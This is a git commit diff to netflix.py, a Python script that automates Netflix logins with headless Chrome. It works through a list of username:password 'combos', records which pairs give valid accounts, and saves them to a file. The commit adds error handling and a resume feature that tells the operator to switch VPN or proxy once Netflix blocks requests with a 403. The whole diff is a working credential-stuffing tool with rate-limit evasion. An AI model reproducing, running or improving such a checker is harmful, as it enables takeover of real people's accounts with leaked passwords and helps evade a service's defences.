8878dc9829dc2ced1becc04852cc9ab1456e735a
g3th <theinkandpen@yahoo.co.uk>
2023-01-07 01:56:08 +0000

    error handling, fixed resume function 	modified:   netflix.py

--- netflix.py
+++ netflix.py
@@ -49,77 +49,71 @@ for file_ in range(len(files)):
 				else:
 					user.append(line.split(":")[0])
 					passw.append(line.split(":")[1])
-				updated_list.append("{}:{}\n".format(user[counter], passw[counter]))
-				counter += 1
+			for line in range(len(user)):	
+				updated_list.append("{}:{}\n".format(user[line], passw[line].strip()))
 		net.close()
 
-counter = 0		
 print_ip_and_country()
 page = "https://www.netflix.com/login"
 
-
 while counter < len(user):
-
-	#Check Access Status
-	request = requests.get(page)		
-	if request.status_code == 403:
-		print("\033[38;5;7mConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
-		with open('resume','a') as resume:
-			for line in range(len(user)):
-				resume.write("{}:{}\n".format(user[line],passw[line].strip()))
-		resume.close()
-		exit()
-	else:
-		print("\033[38;5;7mConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo:\033[38;5;190m {}:{} \033[38;5;7m|".format(user[counter], passw[counter].strip()),end='')
+	try:
+		print("\033[38;5;7mConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo:\033[38;5;190m {}:{} \033[38;5;7m|".format(user[counter], passw[counter].strip()),end='')	
+		#Clear Terminal after n accounts
+		if clear_page > 10:
+			title()
+			print_ip_and_country()
+			clear_page = 0
+		#Account Checker
+		browser_options = Options()
+		browser_options.add_argument ={'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'}
+		browser_options.headless = True
+		browser = webdriver.Chrome(options = browser_options)
+		browser.set_window_size(300,400)
+		browser.get(page)		
+		time.sleep(0.4)
+		login = browser.find_element(By.XPATH, '//*[@id="id_userLoginId"]')
+		password = browser.find_element(By.XPATH, '//*[@id="id_password"]')
+		button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
+		login.send_keys(user[counter])
+		time.sleep(0.2)
+		password.send_keys(passw[counter].strip())
+		time.sleep(0.2)
+		button.click()
+		time.sleep(2)
 		
-	#Clear Terminal after n accounts	
-	if clear_page > 10:
-		title()
-		print_ip_and_country()
-		clear_page = 0
+		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'):
+			login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
+			if "Sorry, we can't find an account with this email address." in login_error:
+				print("\033[38;5;7m Result = \033[38;5;196m Invalid Email")
+
+			if "Incorrect password" in login_error:
+				print("\033[38;5;7m Result = \033[38;5;196m Invalid Password")
+
+		if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
+			print("\033[38;5;226m Result = \033[38;5;196m Account Cancelled")
+
+		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
+			print("\033[38;5;7m Result = \033[38;5;46m Valid Account - Stored")
+			with open('valid','a') as valid:
+				valid.write("{}:{}\n".format(user[counter],passw[counter]))
 		
-	#Account Checker
-	browser_options = Options()
-	browser_options.add_argument ={'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'}
-	browser_options.headless = True
-	browser = webdriver.Chrome(options = browser_options)
-	browser.set_window_size(300,400)
-	browser.get(page)		
-	time.sleep(0.4)
-	login = browser.find_element(By.XPATH, '//*[@id="id_userLoginId"]')
-	password = browser.find_element(By.XPATH, '//*[@id="id_password"]')
-	button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
-	login.send_keys(user[counter])
-	time.sleep(0.2)
-	password.send_keys(passw[counter].strip())
-	time.sleep(0.2)
-	button.click()
-	time.sleep(2)
-	
-	if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'):
-		login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
-		if "Sorry, we can't find an account with this email address." in login_error:
-			print("\033[38;5;7m Result = \033[38;5;196m Invalid Email")
-
-		if "Incorrect password" in login_error:
-			print("\033[38;5;7m Result = \033[38;5;196m Invalid Password")
-
-	if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
-		print("\033[38;5;226m Result = \033[38;5;196m Account Cancelled")
-
-	if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
-		print("\033[38;5;7m Result = \033[38;5;46m Valid Account - Stored")
-		with open('valid','a') as valid:
-			valid.write("{}:{}\n".format(user[counter],passw[counter]))
-	
-	if len(updated_list) > 1:
-		del updated_list[0]
-	time.sleep(1)
-	counter += 1
-	clear_page += 1	
-	browser.close()
+		if len(updated_list) > 1:
+			del updated_list[0]
+		time.sleep(1)
+		counter += 1
+		clear_page += 1
+		browser.close()
+	except:
+		request = requests.get(page)		
+		if request.status_code == 403:
+			print("\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
+			with open('resume','a') as resume:
+				for line in range(len(updated_list)):
+					resume.write("{}\n".format(updated_list[line].strip()))
+			resume.close()
+			exit()
 		
 print("\nAll done.")
 if resume_flag == True:
 	os.remove('resume')
-
